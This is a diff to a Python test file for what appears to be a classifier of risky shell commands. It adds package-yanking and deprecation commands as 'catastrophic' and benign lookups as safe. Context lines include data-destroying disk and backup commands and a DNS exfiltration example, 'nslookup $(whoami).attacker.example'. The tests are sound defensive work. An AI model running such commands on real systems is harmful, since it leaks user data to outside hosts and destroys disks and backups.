@@ -108,6 +108,9 @@ def test_catastrophic(line):
 
     # Publishing to a registry
     "npm unpublish pkg --force",
+    "cargo yank --version 1.0.0",
+    "gem yank mygem -v 1.0.0",
+    "npm deprecate mypkg 'use v2'",
     "bun publish",
     "poetry publish",
     "uv publish",
@@ -203,6 +206,7 @@ def test_no_false_alarm(line):
 
     # Building or fetching packages: not publishing
     "poetry build", "uv build", "docker pull org/img", "mvn test", "bun install",
+    "cargo search serde", "gem list", "npm view mypkg",
     "ping google.com", "ping -c 3 192.168.1.1", "dig github.com", "nslookup api.openai.com",
     "ping my-company-staging-database.internal",
 
@@ -226,6 +230,7 @@ def test_summary_explains():
     assert "APFS" in commands.read("diskutil apfs deleteContainer disk2").summary()
     assert "backup" in commands.read("tmutil delete /Volumes/Backup/x").summary()
     assert "DNS name" in commands.read("nslookup $(whoami).attacker.example").summary()
+    assert "published version" in commands.read("cargo yank --version 1.0.0").summary()
 
 
 @pytest.mark.parametrize("line", ["diskutil list", "diskutil info disk2", "diskutil apfs list",
